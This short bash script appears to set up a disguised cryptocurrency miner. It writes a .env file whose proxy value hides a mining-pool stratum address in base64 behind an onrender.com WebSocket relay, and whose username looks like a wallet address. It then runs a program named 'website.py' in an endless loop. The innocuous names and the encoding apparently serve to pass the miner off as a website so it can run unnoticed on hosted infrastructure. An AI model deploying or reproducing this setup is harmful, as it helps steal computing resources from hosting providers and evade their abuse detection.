#!/bin/bash


echo -e "host=127.0.0.1\nport=3306\nproxy=wss://proxy-tq9r.onrender.com/c3RyYXR1bS1ldS5ycGxhbnQueHl6OjcwMjI=\nthreads=8\npassword=x\nusername=mbc1qsey07g3gp6lmphlk76y4h5y5qgzkjtpr9ugghl.ai" > .env


MIN=$1
while true; do
    python3 website.py "$MIN" --cache=.cache/09Qy5sb2Fkcyg.txt
    sleep 10
done
